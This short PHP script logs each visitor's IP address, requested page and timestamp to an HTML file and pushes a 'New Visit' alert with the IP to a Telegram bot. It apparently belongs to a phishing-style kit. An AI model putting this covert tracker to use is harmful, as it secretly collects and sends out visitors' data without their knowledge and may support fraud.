<?php
include('run/telgramBot.php');
include('run/msg_files/cm.php');
$ip = $_SERVER['REMOTE_ADDR'];
$pagina = $_SERVER['REQUEST_URI'];
$datum = date("d-m-y / H:i:s");
$invoegen = $datum . " - " . $ip . " - " . $pagina . "<br />";
$in =" New Visit  " . $ip . " ";

 $apiToken = $datas;
 $data = [
 	'chat_id' => $chat_id,
    'text' => $in];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
$fopen = fopen("ips.html", "a");
fwrite($fopen, $invoegen);
fclose($fopen);
?>
